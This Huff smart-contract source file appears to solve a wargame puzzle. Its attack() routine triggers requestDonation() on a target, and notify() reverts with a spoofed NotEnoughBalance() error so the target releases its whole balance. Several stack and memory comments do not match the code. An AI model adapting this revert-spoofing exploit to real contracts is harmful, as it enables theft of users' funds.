// Storage 
#define constant OWNER_SLOT = FREE_STORAGE_POINTER()
#define constant INSTANCE_SLOT = FREE_STORAGE_POINTER()

// Constructor
#define macro CONSTRUCTOR() = takes (0) returns (0) {
    // Copy caller into OWNER_SLOT in storage
    caller          // [msg.sender] - msg.sender
    [OWNER_SLOT]    // [0x00, msg.sender] OWNER_SLOT is the 0th slot in storage
    sstore          // [] - sstore consumes top 2 stack items. The first item is
                    // the key (storage location) and the second item is the value (item to store)

    // Copy constructor argument (address) into memory
    0x20            // [0x20] - This will be the size for the the code we will copy to memory
    dup1            // [0x20, 0x20] - This will be used to calculate offset for which we will copy code from current environment
    codesize        // [code_size, 0x20, 0x20] - codesize pushes the size of code in current environment on to stack
    sub             // [offset, 0x20] - sub consumes top two items off stack and subtracts item 1 from item 2. Used to calculate offset for codecopy
    returndatasize  // [0x00, offset, 0x20] - 0x00 is the destination offset in memory for the code we will copy
    codecopy        // [] - codecopy consumes top 3 items off stack. codecopy(destOffset, offset, size)

    // Copy address from memory into INSTANCE_SLOT in storage
    returndatasize  // [0x00] - This is the offset in memory for which to copy 32 bytes from (our address param) 
    mload           // [address_param] - mload consumes top item off stack and pushes 32 bytes from that offset in memory onto stack => mload(offset)
    [INSTANCE_SLOT] // [0x01, address_param] - INSTANCE_SLOT is the 1st storage slot where we will store address_param
    sstore          // [] - sstore consumes top two items off stack. sstore(key, value)
}

// Modifier
#define macro ONLY_OWNER() = takes (0) returns (0) {
    caller          // [caller]
    [OWNER_SLOT]    // [0x00, caller] - storage slot where owner is stored
    sload           // [owner, caller] - loaded owner address onto stack from storage slot 0x00
    eq              // [0/1] - consumes top two items and returns 1 if equal, 0 otherwise
    is_owner        // [is_owner_label, 0/1] - byte offset in code for execution path
    jumpi           // [] - consumes top two items and execution path jumps to is_owner_label if 2nd item is not 0

    0x00            // [0x00] - size
    0x00            // [0x00, 0x00] - byte offset
    revert          // [] - reverts with data of size 0x00, starting from byte offset 0x00 in memory (reverts with no data)

    is_owner:       // is_owner label. execution continues here is the caller is the owner
}

// Attack function
#define macro ATTACK() = takes(0) returns (0) {
    // Copy `requestDonation()` func sig into memory to use as calldata for CALL
    0x25143638      // [0x25143638] - func sig
    0x00            // [0x00, 0x25143638] - byte offset
    mstore          // [] - copied func sig into memory at byte offset 0x00

    // MEMORY:
    // [OFFSET 0] 000000000000000000000000000000000000000000000000000000000025143638 -> `requestDonation()` func sig

    // CALL into instance
    [INSTANCE_SLOT] // [0x01] - storage slot where instance address is
    sload           // [instance] - copied instance from storage slot 0x01
    0x00            // [0x00, instance] - size of return data
    0x00            // [0x00, 0x00, instance] - byte offset in memory where return data is copied
    0x04            // [0x04, 0x00, 0x00, instance] - size of calldata
    0x1c            // [0x1c, 0x04, 0x00, 0x00, instance] - byte offset in memory where calldata starts
    0x00            // [value, 0x1c, 0x04, 0x00, 0x00, instance] - msg.value to send with call (none)
    dup6            // [instance, value, 0x1c, 0x04, 0x00, 0x00, instance] - calling instance
    gas             // [gas, instance, value, 0x1c, 0x04, 0x00, 0x00, instance] - gas to send with call (gasleft())
    call            // [success, instance] - consumes 7 items off stack and pushes 1 if call did not revert, 0 otherwise
    iszero          // [0/1, instance]
    throw_error     // [throw_error, 0/1, instance]
    jumpi           // [instance]

    // Copy `coin()` into memory to use as calldata for STATICCALL
    0x11df9995      // [0x11df9995, instance] - func sig
    0x00            // [0x00, 0x11df9995 instance] - byte offset
    mstore          // [instance] - copied func sig into memory starting at byte offset 0x00

    // MEMORY:
    // [OFFSET 0] 000000000000000000000000000000000000000000000000000000000011df9995 -> `coin()` func sig
    
    // STATICCALL into instance
    0x20            // [0x20, instance] - size of return data (address)
    0x20            // [0x20, 0x20, instance] - byte offset in memory where return data is copied
    0x04            // [0x04, 0x20, 0x20, instance] - size of calldata
    0x1c            // [0x1c, 0x04, 0x20, 0x20, instance] - byte offset in memory where calldata starts
    dup5            // [instance, 0x1c, 0x04, 0x20, 0x20, instance] - calling instance
    gas             // [gas, instance, 0x1c, 0x04, 0x20, 0x20, instance] - gas to send with call (gasleft())
    staticcall      // [success, instance] - consumes 6 items off stack and pushes 1 if call was successful, 0 otherwise
    iszero          // [0/1, instance]
    throw_error     // [throw_error, 0/1, instance]
    jumpi           // [instance]

    // MEMORY:
    // [OFFSET 0]  00000000000000000000000000000000000000000000000000000000521eb273 -> `wallet()` func sig
    // [OFFSET 32] 000000000000000000000000ab86e65fe1dcd475e75c39a95f1711ec647336a3 -> return data (coin address)

    // Copy coin address onto stack to use fo future STATICCALL
    0x20            // [0x20, instance] - byte offset
    mload           // [coin, instance] - copied coin address onto stack

    // Copy `wallet()` func sig into memory to use as calldata for STATICCALL
    0x521eb273      // [0x521eb273, coin, instance] - func sig
    0x00            // [0x00,0x521eb273, coin, instance] - byte offset
    mstore          // [coin, instance] - copied func sig into memory starting at offset 0x00

    // MEMORY:
    // [OFFSET 0] 00000000000000000000000000000000000000000000000000000000521eb273 -> `wallet()` func sig
    // [OFFSET 32] 000000000000000000000000ab86e65fe1dcd475e75c39a95f1711ec647336a3 -> return data (coin address)

    // STATICCALL into instance
    0x20            // [0x20, coin, instance] - size of return data (address)
    0x20            // [0x20, 0x20, coin, instance] - byte offset in memory where return data is copied
    0x04            // [0x04, 0x20, 0x20, coin, instance] - size of calldata
    0x1c            // [0x1c, 0x04, 0x20, 0x20, coin, instance] - byte offset in memory where calldata starts
    dup6            // [instance, 0x1c, 0x04, 0x20, 0x20, coin, instance] - calling instance
    gas             // [gas, instance, 0x1c, 0x04, 0x20, 0x20, coin, instance] - gas to send with call (gasleft())
    staticcall      // [success, coin, instance] - consumes 6 items off stack and pushes 1 if call was successful, 0 otherwise
    iszero          // [0/1, coin, instance]
    throw_error     // [throw_error, 0/1, coin, instance]
    jumpi           // [coin, instance]

    // MEMORY:
    // [OFFSET 0]  00000000000000000000000000000000000000000000000000000000521eb273 -> `wallet()` func sig
    // [OFFSET 32] 000000000000000000000000ae1084a87693f9c2b1ad12b7ddc6407113865938 -> return data (wallet address)

    // Copy `balances(address)` func sig into memory to use as calldata for STATICCALL 
    0x27e235e3      // [0x27e235e3, coin, instance]
    0x00            // [0x00, 0x27e235e3, coin, instance] - byte offset
    mstore          // [coin, instance] - copied func sig into memory starting at offset 0x00

    // MEMORY:
    // [OFFSET 0]  0000000000000000000000000000000000000000000000000000000027e235e3 -> `balances(address)` func sig
    // [OFFSET 32] 000000000000000000000000ae1084a87693f9c2b1ad12b7ddc6407113865938 -> return data (wallet address)

    // STATICCALL into coin
    0x20            // [0x20, coin, instance] - size of return data (uint256)
    0x20            // [0x20, 0x20, coin instance] - byte offset in memory where return data is copied
    0x24            // [0x04, 0x20, 0x20, coin, instance] - size of calldata
    0x1c            // [0x1c, 0x04, 0x20, 0x20, coin, instance] - byte offset in memory where calldata starts
    dup5            // [instance, 0x1c, 0x04, 0x20, 0x20, coin, instance] - calling instance
    gas             // [gas, instance, 0x1c, 0x04, 0x20, 0x20, coin, instance] - gas to send with call (gasleft())
    staticcall      // [success, coin, instance] - consumes 6 items off stack and pushes 1 if call was successful, 0 otherwise
    iszero          // [0/1, coin, instance]
    throw_error     // [throw_error, 0/1, coin, instance]
    jumpi           // [coin, instance]
    pop             // [instance]
    pop             // []

    // MEMORY:
    // [OFFSET 0]  0000000000000000000000000000000000000000000000000000000027e235e3 -> `balances(address)` func sig
    // [OFFSET 32] 0000000000000000000000000000000000000000000000000000000000000000 -> return data (uint256)

    // Check return data and verify that it is equal to 0
    0x20            // [0x20] - byte offset
    mload           // [return_data]
    throw_error     // [throw_error, return_data]
    jumpi           // []

    stop
}

// Notify function
#define macro NOTIFY() = takes (1) returns (0) {
    // Revert with custom error if param is equal to 10
    dup1                        // [param, param] - duplicate param
    0x0a                        // [0x0a, param, param] - push 10 onto stack
    eq                          // [0/1, param] - if 10 greater than param, push 1, 0 otherwise
    custom_revert               // [custom_revert, 0/1, param]
    jumpi                       // [param]
    stop

    custom_revert:
        // Copy `NotEnoughBalance()` error sig into memory
        __RIGHTPAD(0xad3a8b9e)  // [0xad3a8b9e, param] - error sig (func sig) for `NotEnoughBalance()`
        0x00                    // [0x00, 0xad3a8b9e, param] - byte offset
        mstore                  // [param] - copied error sig into memory starting at offset 0x00

        // MEMORY:
        // [OFFSET 0] ad3a8b9e0000000000000000000000000000000000000000000000000000000000 -> `NotEnoughBalance()` error sig

        0x04                   // [0x04] - size of data to send with revert
        0x00                   // [0x00, 0x04] - byte offset in memory where data to send with revert starts
        revert                 // [] - revert with custom error
}

// Function Dispatching
#define macro MAIN() = takes (0) returns (0) {
    // Identify which function is being called
    0x00         // [0x00] - the byte offset in calldata that we will read 32 bytes from
    calldataload // [calldata] - calldataload consumes top item from stack and pushes 32 bytes of calldata, from byte offset, onto stack
    0xe0         // [0xe0, calldata] - 0xe0 is 224 bits
    shr          // [func_sig] - shr consumes top two items off the stack, performs a logical right shift and pushes resulting value of stack
                 // Here we are shifting the calldata 224 bits to the right (256 - 224 = 32 bits = 4 bytes) and isolating the first 4 bytes (function sig)

    dup1         // [func_sig, func_sig]
    0x9e5faafc   // [0x9e5faafc, func_sig, func_sig] - pushing func sig of 'attack()' onto the stack
    eq           // [0/1, func_sig] - eq consumes top two items from stack and pushes 1 onto stack if they are equal, otherwise 0
    attack       // [attack_label, 0/1, func_sig] - attack_label is a label (byte offset) for the attack instructions
    jumpi        // [func_sig] = jumpi consumes top two items from stack and jumps to new execution path if second item is not 0, otherwise executions continues on current path

    dup1         // [func_sig, func_sig]
    0x98d078b4   // [0x98d078b4, func_sig, func_sig] - pushing func sig of 'notify(uint256)' onto the stack
    eq           // [0/1, func_sig] - eq consumes top two items from stack and pushes 1 onto stack if they are equal, otherwise 0
    notify       // [nofity, 0/1, func_sig] - nofity is a label (byte offset) for the notify instructions
    jumpi        // [func_sig] = jumpi consumes top two items from stack and jumps to new execution path if second item is not 0, otherwise executions continues on current path


    throw_error: // label for revert path
        0x00 0x00 revert

    attack:      // label for attack instructions
        ONLY_OWNER()
        ATTACK()

    notify:      // label for notify instructions
        0x04 
        calldataload // [param]
        NOTIFY() 
}
